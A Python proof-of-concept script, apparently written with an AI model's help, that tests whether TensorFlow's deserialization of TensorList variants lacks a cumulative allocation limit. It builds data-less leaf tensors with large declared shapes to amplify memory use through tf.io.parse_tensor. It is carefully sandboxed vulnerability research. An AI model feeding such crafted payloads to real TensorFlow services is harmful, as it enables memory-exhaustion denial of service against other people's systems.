"""
Proof-of-mechanism: missing cumulative allocation accounting during
Variant/TensorList deserialization in TensorFlow.

DO NOT RUN THIS ON SHARED OR UNBOUNDED INFRASTRUCTURE.
Run only inside an isolated container (Docker/Killercoda) with an explicit
memory limit set at the CONTAINER level (e.g. `docker run -m 2g ...`), so
that if the hypothesis is wrong in some way I haven't anticipated, the
container's cgroup kills the process instead of the host OOM-killer
picking an arbitrary victim.

Recommended run command:
    docker run --rm -m 2g --memory-swap 2g -it tensorflow/tensorflow:2.21.0 \
        python3 tensorlist_variant_amplification_poc.py

What this demonstrates (per the methodology agreed on in this conversation):
  1. Build a single Variant-typed TensorProto wrapping a
     VariantTensorDataProto of type "tensorflow::TensorList".
  2. That TensorList's `tensors` field contains N leaf TensorProtos, each
     declaring a shape but carrying NO actual data (the broadcast/zero-fill
     path, in_n == 0).
  3. Each leaf tensor is deserialized independently via Tensor::FromProto,
     which applies IsSafeProtoAllocation(in_n, n, element_size) --
     independently, per leaf. There is no code path that sums allocations
     across siblings before allowing the next one.
  4. Feed the whole thing through tf.io.parse_tensor and measure RSS growth
     as a function of N (number of leaf tensors) at a FIXED per-leaf size.
     If growth is linear in N with no plateau/rejection, that's the
     mechanism confirmed empirically, not just from source reading.

This script deliberately keeps per-leaf size modest (default 32MB) and lets
you control N via the SIZES list below -- start small, increase gradually,
and watch the container's own memory reporting (`docker stats` in another
terminal) rather than trusting only this script's self-reported RSS.
"""

import resource
import struct
import sys

import tensorflow as tf
from tensorflow.core.framework import tensor_pb2, types_pb2


def rss_mb():
    return resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / 1024


def make_leaf_tensorproto(num_float_elements: int) -> tensor_pb2.TensorProto:
    """A TensorProto that declares `num_float_elements` floats but carries
    zero actual data -- triggers the broadcast/zero-fill amplification path
    (in_n == 0) inside FromProtoField."""
    proto = tensor_pb2.TensorProto()
    proto.dtype = types_pb2.DT_FLOAT
    dim = proto.tensor_shape.dim.add()
    dim.size = num_float_elements
    # deliberately NOT setting float_val or tensor_content -> in_n == 0
    return proto


def make_tensorlist_variant(leaf_element_counts):
    """Wrap N leaf TensorProtos inside a single Variant of type
    'tensorflow::TensorList', matching the wire format TensorList::Encode
    produces (see tensorflow/core/kernels/tensor_list.cc).

    NOTE: we deliberately do NOT import variant_tensor_data_pb2 directly --
    it isn't exposed at that path in the public pip wheel (only a curated
    subset of generated proto bindings ship there). Instead we build
    directly on the VariantTensorDataProto instance that
    `outer.variant_val.add()` already gives us, via TensorProto's own
    internal dependency graph -- no separate import needed.
    """
    outer = tensor_pb2.TensorProto()
    outer.dtype = types_pb2.DT_VARIANT
    dim = outer.tensor_shape.dim.add()
    dim.size = 1

    variant_val = outer.variant_val.add()  # a VariantTensorDataProto
    variant_val.type_name = "tensorflow::TensorList"
    # TensorList::Decode also expects a `metadata` field it can parse as a
    # TensorListProto-ish structure for element_dtype/element_shape/
    # num_elements bookkeeping. If your TF version rejects malformed
    # metadata before reaching the per-tensor loop, you'll need to
    # populate a minimal valid metadata blob here -- check
    # tensorflow/core/kernels/tensor_list.cc / tensor_list.proto for the
    # exact expected format for your version, since this has changed
    # across TF releases. Leaving it empty first is the right move: if
    # decode fails, the error message tells you whether it failed on
    # metadata parsing (need to fix this) or got past it (mechanism test
    # is live).
    for n in leaf_element_counts:
        leaf = variant_val.tensors.add()
        leaf.CopyFrom(make_leaf_tensorproto(n))

    return outer.SerializeToString()


def run_trial(per_leaf_elements: int, leaf_count: int):
    print(f"\n--- Trial: {leaf_count} leaf tensors x "
          f"{per_leaf_elements} float32 elements "
          f"({per_leaf_elements * 4 / 1e6:.1f} MB each, "
          f"{leaf_count * per_leaf_elements * 4 / 1e6:.1f} MB total if "
          f"unguarded) ---")
    print("RSS before:", round(rss_mb()), "MB")

    serialized = make_tensorlist_variant([per_leaf_elements] * leaf_count)
    print("Serialized wire size:", len(serialized), "bytes")

    try:
        result = tf.io.parse_tensor(serialized, out_type=tf.variant)
        print("Parsed OK. RSS after:", round(rss_mb()), "MB")
    except tf.errors.OpError as e:
        print("Rejected by TF (this would be the GOOD outcome):",
              type(e).__name__, str(e)[:200])


if __name__ == "__main__":
    # Set a hard address-space ceiling as defense-in-depth on top of the
    # container's own cgroup limit. Adjust to comfortably under your
    # `docker run -m` value.
    SOFT_LIMIT_BYTES = 1_800_000_000  # 1.8 GB, pair with `docker run -m 2g`
    resource.setrlimit(resource.RLIMIT_AS, (SOFT_LIMIT_BYTES, SOFT_LIMIT_BYTES))

    PER_LEAF_ELEMENTS = 8_000_000  # 32MB per leaf tensor (float32)

    # Start small and increase leaf_count manually between runs while
    # watching `docker stats` -- don't jump straight to a large N.
    for n_leaves in (1, 2, 4, 8):
        run_trial(PER_LEAF_ELEMENTS, n_leaves)
